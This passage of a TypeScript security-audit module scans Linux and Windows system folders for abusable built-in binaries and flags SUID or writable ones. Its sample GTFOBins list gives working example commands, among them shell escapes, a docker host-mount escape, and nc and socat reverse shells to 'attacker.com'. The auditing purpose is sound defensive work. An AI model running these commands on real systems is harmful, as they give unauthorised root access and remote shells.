      { name: "find", path: "/usr/bin/find", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "find / -exec /bin/sh \\; -quit" },
      { name: "vim", path: "/usr/bin/vim", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "vim -c ':!/bin/sh'" },
      { name: "less", path: "/usr/bin/less", type: "GTFOBins", capabilities: ["EXECUTE", "BYPASS"], exampleUsage: "less /etc/passwd\\n!/bin/sh" },
      { name: "man", path: "/usr/bin/man", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "man man\\n!/bin/sh" },
      { name: "git", path: "/usr/bin/git", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "git help config -p | sh" },
      { name: "nmap", path: "/usr/bin/nmap", type: "GTFOBins", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "nmap --script <payload.nse> target" },
      { name: "nc", path: "/usr/bin/nc", type: "GTFOBins", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "nc -e /bin/sh attacker.com 4444" },
      { name: "socat", path: "/usr/bin/socat", type: "GTFOBins", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "socat TCP:attacker.com:4444 EXEC:/bin/sh" },
      { name: "env", path: "/usr/bin/env", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "env /bin/sh -p" },
      { name: "awk", path: "/usr/bin/awk", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "awk 'BEGIN {system(\"/bin/sh\")}'" },
      { name: "xargs", path: "/usr/bin/xargs", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "xargs -a /dev/null /bin/sh" },
      { name: "docker", path: "/usr/bin/docker", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
      { name: "perl", path: "/usr/bin/perl", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "perl -e 'exec \"/bin/sh\";'" },
      { name: "ruby", path: "/usr/bin/ruby", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "ruby -e 'exec \"/bin/sh\"'" },
      { name: "php", path: "/usr/bin/php", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "php -r 'pcntl_exec(\"/bin/sh\");'" },
      { name: "node", path: "/usr/bin/node", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "node -e 'require(\"child_process\").spawn(\"/bin/sh\")'" },
      { name: "strace", path: "/usr/bin/strace", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "strace -o /dev/null /bin/sh -p" },
      { name: "gdb", path: "/usr/bin/gdb", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "gdb -nx -ex '!sh' -ex quit" },
    ],
    isDryRun: true,
  }
}

// ── Live Scanner ─────────────────────────────────────────────────────────────

function getSearchPaths(platform: "windows" | "linux" | "darwin"): string[] {
  if (platform === "windows") {
    const windir = process.env.WINDIR || "C:\\Windows"
    return [
      `${windir}\\System32`,
      `${windir}\\System32\\WindowsPowerShell\\v1.0`,
      `${windir}\\SysWOW64`,
      `${windir}\\Microsoft.NET\\Framework64\\v4.0.30319`,
      `${windir}\\Microsoft.NET\\Framework\\v4.0.30319`,
      `${windir}\\Microsoft.NET\\Framework64\\v3.0\\Windows Communication Foundation`,
      "C:\\Program Files\\dotnet",
    ]
  }
  // Linux / macOS - standard bin directories
  return ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin", "/opt/homebrew/bin"]
}

function scanLive(platform: "windows" | "linux" | "darwin"): LOLBinsAuditResult {
  const discovered: LOLBinEntry[] = []
  const scannedPaths = getSearchPaths(platform)
  const database = platform === "windows" ? LOLBAS_DATABASE : GTFOBINS_DATABASE
  const scannedCount = new Set<string>()

  for (const searchDir of scannedPaths) {
    if (!fs.existsSync(searchDir)) continue

    let entries: string[]
    try {
      entries = fs.readdirSync(searchDir)
    } catch {
      continue
    }

    for (const entry of entries) {
      const fullPath = path.join(searchDir, entry)
      const stat = statSafe(fullPath)
      if (!stat || !stat.isFile()) continue
      if (scannedCount.has(fullPath)) continue
      scannedCount.add(fullPath)

      // Match against database (case-insensitive on Windows)
      const searchName = platform === "windows" ? entry.toLowerCase() : entry
      const match = database.find(
        b => b.name.toLowerCase() === searchName ||
          (b.searchNames?.some(sn => sn.toLowerCase() === searchName))
      )
      if (!match) continue

      const suid = platform !== "windows" && isSuid(stat.mode)
      const writable = isWritable(stat.mode, stat.isDirectory())

      const capabilities = [...match.caps]
      // Add PRIV_ESC if SUID bit is set
      if (suid && !capabilities.includes("PRIV_ESC")) {
        capabilities.push("PRIV_ESC")
      }

      discovered.push({
        name: match.name,
        path: fullPath,
        type: platform === "windows" ? "LOLBas" : "GTFOBins",
        capabilities: capabilities as LOLBinEntry["capabilities"],
        exampleUsage: match.usage,
        suid,
        writable,
      })
    }
  }

  // Additional Windows-specific: check if PowerShell is accessible via isToolAvailable
  if (platform === "windows") {
    for (const extra of ["powershell.exe", "pwsh.exe", "cmd.exe"]) {
      if (!scannedCount.has(extra) && isToolAvailable(extra.replace(".exe", ""))) {
        const match = LOLBAS_DATABASE.find(b => b.name === extra)
        if (match && !discovered.find(d => d.name === match.name)) {
          discovered.push({
            name: match.name,
            path: match.name,
            type: "LOLBas",
            capabilities: match.caps as LOLBinEntry["capabilities"],
            exampleUsage: match.usage,
          })
        }
      }
    }
  }

  return {
    platform,
    binariesScanned: scannedCount.size,
    discoveredLOLBins: discovered,
    isDryRun: false,
  }
}

// ── Main Export ──────────────────────────────────────────────────────────────

export function auditLOLBins(options: { dryRun?: boolean; live?: boolean } = {}): LOLBinsAuditResult {
  const dryRun = options.dryRun ?? options.live === undefined ? true : !options.live
  const platform: "windows" | "linux" | "darwin" =
    process.platform === "win32" ? "windows" : process.platform === "darwin" ? "darwin" : "linux"

  if (dryRun) {
    return generateDryRunResult(platform)
  }

  return scanLive(platform)
}

export default { auditLOLBins }
